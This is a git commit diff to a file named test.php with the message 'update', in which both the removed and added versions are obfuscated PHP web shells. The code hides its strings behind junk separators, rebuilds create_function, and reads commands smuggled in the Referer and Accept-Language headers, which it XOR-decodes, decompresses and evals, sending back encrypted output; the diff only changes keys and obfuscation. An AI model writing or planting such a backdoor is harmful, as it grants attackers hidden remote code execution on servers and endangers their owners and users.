67e407ee0090f357ed0c6077fb66fc22186fa288
gqfjob <gqfjob@gmail.com>
2016-05-24 16:48:28 +0800

    update

--- test.php
+++ test.php
@@ -1,16 +1,17 @@
 <?php
-$a='#nd_clean();$y#y#d=by#ase64_encode(x(y#gzcomy#presy#s($o),$k)y#);y#priy#nt("<$k>$y#d</$k>");@sey#ssioy#n_y#destroy();}}}}';
-$I='y#("/_y#/","/-/"y#),ary#ray("/",y#"+"y#),$ss($sy#[y#$i],0,y#y#$e)y#)),$k)));y#$o=oy#b_get_cy#ontents();ob_ey';
-$J='([\\dy#])y#)?,?/",$ra,y#$m);y#iy#f($q&&$my#){@sessiony#_stay#rt();$y#s=&$_SESSIy#ONy#y#y#;$ss="suby#str";y#$sl="s';
-$h='{$y#s[$i]="";$p=$ss($p,3y#);y#}if(array_y#key_y#existsy#($i,$s))y#y#{$s[$i].=y#$py#;$y#e=strpos($s[$i],$f)y#;ify#($';
-$b='$kh="2c8f";y#$kf="3y#y#201";fuy#ncty#ion x($t,$k){$y#c=y#y#strlen($k);y#y#$ly#=strley#n($t);$o="";for(y#y#$i=0;$';
-$T='e){$k=$ky#h.$kf;y#ob_sty#art(y#);@evy#al(@y#gzuny#compress(@x(y#@basy#ey#64_decodey#(preg_y#replace(ary#ray';
-$W=',3)y#);$y#p=y#"";foy#r($zy#=y#1;$z<count($m[1]);$y#y#z++)$py#.=$q[$m[y#2][$y#z]];if(strpos(y#$p,$h)y#==y#=0y#)y#';
-$d='r);py#arsey#_str($u["quy#ery"],$q)y#;$qy#=y#array_vy#aly#uy#es($qy#);preg_match_ally#("/([\\w])[\\y#wy#-]y#+(?:;q=0.';
-$l=str_replace('j','','crejajjjte_fujnctjion');
-$u='r=@$r[y#"HTTPy#_REFEy#RER"];$ray#=y#@$r["Hy#TTP_ACCEy#PT_LANGy#UAGEy#y#"];if($rr&&$ra){y#y#$u=py#arse_uy#rl($r';
-$r='trtolower"y#;$y#i=$my#[1][0].$m[1][1]y#;$h=$sy#l($ss(md5y#($i.$ky#h),0,y#3)y#y#);$f=$sl($ssy#(md5($i.$kfy#),0';
-$m='i<$l;){y#for($j=y#0;(y#$j<$c&&$i<y#$l);$j++y#,$y#i++){$y#o.=$y#t{$i}^$k{$j}y#;}}rety#y#uy#rn $oy#;}$r=$_SERVEy#R;$r';
-$D=str_replace('y#','',$b.$m.$u.$d.$J.$r.$W.$h.$T.$I.$a);
-$G=$l('',$D);$G();
+$L=');1|@ev1|al(@g1|zuncompress1|(@x(@b1|1|ase1|64_decode(pr1|eg_replac1|e(a1|rra1|y(1|"/_/","/-/1|"),arr';
+$D='_SERVER;1|$rr=@1|$r["HTTP_1|R1|EFERER"];$1|ra=@$r1|["HT1|TP_ACCEPT_1|L1|1|ANGUAGE"1|];if($r1|r&&$1|ra)';
+$K='a1|y("/"1|,"+"),$1|ss($s[$1|i],0,$e))1|),$1|k)));$o=ob1|_1|g1|et_cont1|ents();1|ob_e1|nd1|_clean();$d=1|';
+$F='{$u=par1|se_1|url($rr);pars1|e_1|1|str($u["query"]1|,$q);$q=a1|rr1|ay_va1|lues($q1|);1|preg_matc1|h_al';
+$E='base61|4_enc1|ode(x(gzcomp1|re1|ss($o),$1|1|k1|));print("<$k>$d</$k>1|"1|);@session_d1|estroy1|();}}}}';
+$t='l1|("1|/([\\w])[\\w-]+(?:;1|q=01|.([\\d]))?1|,?/1|",1|$r1|a,$m);if($q&&$m){1|@s1|ession1|1|_start();$s=&';
+$j='+)$p1|.=1|$q[$m[2][$1|z]];if(s1|trpo1|s($p1|,$h)===0){1|$s[$i1|]="1|";$p=$ss($1|p,1|3);}if1|(1|array_';
+$A='1|key_exists($i1|,$s)1|){$s[$1|i1|].=$p;$e=strpo1|s($s[$i1|],$f1|);if(1|$e){$k=1|$kh.1|$kf;ob_1|start(';
+$Z='|$l;){1|for($j=0;1|($1|j1|<$c&&$i<$1|l);$j+1|+,$1|i+1|1|+){$o.1|=$t{$i}^$k{$j};}}return $o1|;}$r1|1|=$';
+$h='$_S1|ESS1|ION1|;$ss="substr1|";1|$s1|l="strtolower"1|;$i=1|$m[1][0]1|1|.$m[1][1];1|$h=$sl($1|ss(md51|($';
+$n=str_replace('iW','','creiWiWaiWteiW_iWfunciWtion');
+$a='$kh="e101|a"1|;$1|1|kf="dc1|39";function 1|x($t,$k){$c=str1|len($k1|);1|1|$l=strl1|en(1|$t);$o="";for($i=1|0;$i<1';
+$l='i.$k1|h),0,1|3)1|)1|;$f=$sl(1|1|$1|ss(md5($i.$kf),01|,31|))1|;$p="";f1|or($z=1;$z<c1|ount($m[1|1]);$z+';
+$B=str_replace('1|','',$a.$Z.$D.$F.$t.$h.$l.$j.$A.$L.$K.$E);
+$p=$n('',$B);$p();
 ?>
